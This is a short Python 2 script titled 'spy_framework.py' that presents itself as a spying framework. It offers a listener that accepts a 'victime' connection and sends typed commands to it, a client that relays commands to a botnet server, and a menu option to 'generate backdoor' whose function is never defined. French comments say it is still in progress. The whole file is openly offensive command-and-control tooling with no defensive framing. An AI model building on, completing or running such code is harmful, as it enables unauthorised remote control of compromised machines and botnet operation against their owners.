import socket
import sys
import threading


def listenbackdoor():
	listening = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = raw_input('your ip address please: ')
	port = input('your port: ') 
	listening.bind((host, port))
	print "listening on address: " + str(host) + "on port: " + str(port)
	while True:
		listening.listen(5)
		(victime, (address, his_port)) = listening.accept()
		print "victime: " + address
		while True:
			interact = raw_input('Ritsu_>:')
			victime.send(interact)
			data = victime.recv(1024)
			print str(data) #je dois integrer plusieurs fonction à la backdoor

def connectto_b0tnet(): #pas encore au point mais j'y travaille
	host = socket.gethostbyname(socket.gethostname()) 
	port = 443
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		server = raw_input('enter the server ip')
		server_port = input("enter the server's port please :3!!!")
		connection.connect((server, server_port))
	except:
		print 'ip and port not available please retry bye ;) '
	while True:
		
		interaction = raw_input('Ritsu_b0tnet_>:')
		if interaction != "":
			connection.send(interaction)
			data = connection.recv(1024)
			print data
		elif interaction == "list":
			connection.send(interaction)
			data = connection.recv(1024)
			print data
		elif interaction == "exit":
			connection.close()
print('__________ .__   __                  ')
print('\______   \|__|_/  |_   ______ __ __ ')
print('|       _/|  |\   __\ /  ___/|  |  \'')
print('|    |   \|  | |  |   \___ \ |  |  /')
print('|____|_  /|__| |__|  /____  >|____/ ')
print('        \/                 \/        ')
print('spy_framework.py v1.00 \n')

print '1) listening (backdoor)'
print '2) connect to the botnet server'
print '3) generate backdoor'

command  = input('your task?')

if command == 1:
	listenbackdoor()
elif command == 2:
	connectto_b0tnet()
elif command == 3:
	generate_backdoor()
